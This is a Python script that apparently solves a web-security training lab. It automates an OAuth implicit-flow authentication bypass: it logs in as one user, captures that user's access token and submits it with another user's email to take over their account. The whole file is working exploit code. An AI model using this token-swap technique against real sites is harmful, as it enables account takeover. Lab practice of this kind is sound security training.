import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def extract_uid(text):
    soup = BeautifulSoup(text, 'html.parser')
    path = soup.find('form').get('action') # type: ignore
    return path.split('/')[2] # type: ignore

def oauth_process(s, url, oauth_url, oauth_path, target_username, target_email):
    # authorization
    auth_url = oauth_url + oauth_path
    r = s.get(auth_url)
    uid = extract_uid(r.text)

    # login
    login_url = oauth_url + f'/interaction/{uid}/login'
    payload = {
        'username': 'wiener',
        'password': 'peter'
    }
    r = s.post(login_url, data=payload)

    # consent
    consent_url = oauth_url + f'/interaction/{uid}/confirm'
    r = s.post(consent_url, allow_redirects=False)
    
    # get access token
    auth_url = oauth_url + f'/auth/{uid}'
    r = s.get(auth_url, allow_redirects=False)
    access_token = r.text.split('#access_token=')[1].split('&amp;')[0]
    
    # authentication
    authenticate_url = url + '/authenticate'
    payload = {
        'email': target_email,
        'username': target_username,
        'token': access_token
    }
    r = s.post(authenticate_url, json=payload, allow_redirects=False)
    print(r.text)

    if r.status_code == 302:
        print(f'[+] Successful bypass login to {target_username} account')
    else:
        print(f'[-] Fail to bypass login')
        sys.exit(-1)


def oauth_login_url(s, url, path):
    target = url + path
    r = s.get(target)
    match = re.search(r"url=(https?://[^'\">]+)", r.text)
    if match:
        oauth_url = match.group(1)
        print(f'[+] Found oauth url = {oauth_url}')
        return oauth_url
    else:
        print('[-] Not fount oauth url')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1]

    target_username = 'carlos'
    target_email = 'carlos@carlos-montoya.net'

    oauth = oauth_login_url(s, url, '/social-login')
    oauth_url = oauth.split('/auth')[0]
    oauth_path = oauth.split(oauth_url)[1]

    oauth_process(s, url, oauth_url, oauth_path, target_username, target_email)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()